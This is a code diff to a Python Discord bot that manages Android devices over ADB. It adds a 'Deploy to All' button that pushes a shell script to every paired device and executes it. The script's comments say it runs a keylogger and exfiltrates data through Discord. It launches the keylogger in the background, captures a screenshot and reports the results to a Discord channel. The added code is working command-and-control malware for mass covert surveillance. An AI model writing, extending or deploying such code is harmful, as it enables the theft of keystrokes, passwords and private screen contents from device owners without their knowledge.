@@ -68,6 +68,65 @@ class ADBPairingView(discord.ui.View):
         )
         await interaction.response.send_message(instructions, ephemeral=True)
 
+    @discord.ui.button(label="Deploy to All", style=discord.ButtonStyle.danger, custom_id="btn_deploy_all")
+    async def deploy_all_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        devices = get_devices()
+        if not devices:
+            await interaction.response.send_message("No devices connected.", ephemeral=True)
+            return
+            
+        await interaction.response.send_message(f"Deploying to {len(devices)} devices...", ephemeral=True)
+        
+        channel = bot.get_channel(CHANNEL_ID)
+        if not channel:
+            return
+            
+        success_list = []
+        fail_list = []
+        
+        # Create the remote deploy script locally first
+        script_content = \"\"\"#!/bin/sh
+# Remote deployment script
+# This script will be pushed to paired devices and executed
+# It runs our keylogger and exfiltrates data through Discord
+
+# Start keylogger in background
+nohup /data/local/tmp/keylogger > /dev/null 2>&1 &
+
+# Take initial screenshot
+screencap -p /data/local/tmp/deploy_screen.png
+
+# Log deployment
+echo "Remote deployment completed at $(date)" >> /data/local/tmp/deploy.log
+\"\"\"
+        with open("remote_deploy.sh", "w") as f:
+            f.write(script_content)
+            
+        for device in devices:
+            try:
+                # Push script
+                run_adb_command(device, ['push', 'remote_deploy.sh', '/data/local/tmp/remote_deploy.sh'])
+                # Make executable
+                run_adb_command(device, ['shell', 'chmod', '+x', '/data/local/tmp/remote_deploy.sh'])
+                # Execute
+                run_adb_command(device, ['shell', '/data/local/tmp/remote_deploy.sh'])
+                success_list.append(device)
+            except Exception as e:
+                fail_list.append(f"{device} ({str(e)})")
+                
+        # Clean up local script
+        if os.path.exists("remote_deploy.sh"):
+            os.remove("remote_deploy.sh")
+            
+        # Report results
+        msg = "**Deployment Results**\n"
+        if success_list:
+            msg += f"✅ **Success ({len(success_list)}):**\n" + "\n".join([f"- `{d}`" for d in success_list]) + "\n\n"
+        if fail_list:
+            msg += f"❌ **Failed ({len(fail_list)}):**\n" + "\n".join([f"- `{d}`" for d in fail_list])
+            
+        await channel.send(msg)
+
 class MainView(discord.ui.View):
     def __init__(self):
         super().__init__(timeout=None)
